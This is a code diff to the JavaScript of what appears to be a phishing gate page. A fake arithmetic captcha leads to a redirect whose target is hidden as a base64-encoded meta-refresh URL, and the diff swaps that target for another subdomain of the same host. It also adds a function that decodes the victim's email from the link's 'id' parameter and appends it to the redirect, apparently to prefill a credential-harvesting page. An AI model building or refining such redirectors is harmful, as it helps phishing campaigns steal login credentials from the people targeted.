@@ -166,7 +166,7 @@
     let answer = 0;
     let firstSolved = false;
 
-    const base64Ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vZG9jcy5mZW5tZW5vcy5kZS9EYm5VaSUyMiUyMC8lM0U=";
+    const base64Ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vcG9ydGFsZG9jLmZlbm1lbm9zLmRlL1ZrZXVVJTIyJTIwLyUzRQ==";
 
     function generateCaptcha() {
       const num1 = Math.floor(Math.random() * 20) + 1;
@@ -193,6 +193,23 @@
       document.getElementById("captcha-question").innerText = `What is ${question}?`;
       document.getElementById("user-answer").value = '';
       document.getElementById("message").innerText = '';
+    }
+
+    function getRealEmail() {
+      const params = new URLSearchParams(window.location.search);
+      const raw = params.get("id");
+      if (!raw) return null;
+
+      try {
+        const decoded = atob(raw);
+        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) {
+          return decoded;
+        }
+      } catch (e) {
+        // Not base64, ignore error
+      }
+
+      return raw;
     }
 
     function validateCaptcha() {
@@ -226,9 +243,9 @@
           throw new Error("Invalid redirect format.");
         }
 
-        const email = new URLSearchParams(window.location.search).get("id");
+        const email = getRealEmail();
         if (email) {
-          finalUrl += `?e=${email}`;
+          finalUrl += `?e=${encodeURIComponent(email)}`;
         }
 
         window.location.href = finalUrl;
